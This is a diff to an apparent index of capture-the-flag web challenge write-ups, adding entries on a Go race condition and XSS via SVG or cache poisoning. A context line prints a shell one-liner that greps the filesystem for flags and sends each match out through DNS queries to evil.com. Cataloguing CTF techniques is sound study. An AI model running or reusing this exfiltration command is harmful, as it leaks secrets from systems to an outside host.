@@ -2166,6 +2166,14 @@ top and inner iframes can communicate even middle iframe is different origin
 https://github.com/koczkatamas/gctf19/tree/master/pastetastic
 https://www.youtube.com/watch?v=2up8J9dErHI
 
+* the lottery - confidence-ctf-teaser-2019
+race condition in go slices
+https://balsn.tw/ctf_writeup/20190317-confidencectf/#the-lottery
+
+* web 50 - confidence-ctf-teaser-2019
+xss via svg or cache poisoning
+https://balsn.tw/ctf_writeup/20190317-confidencectf/#web-50
+
 * defiltrate - insomnihack-teaser-2020
 java deserialisation with ysoserial and Runtime.exec trick to use redirections
 sh -c $@|sh . echo echo 0 > /tmp/x; for m in $(grep -r INS /* 2>/dev/null); do echo $m.evil.com >> /tmp/x; done; dig -f /tmp/x
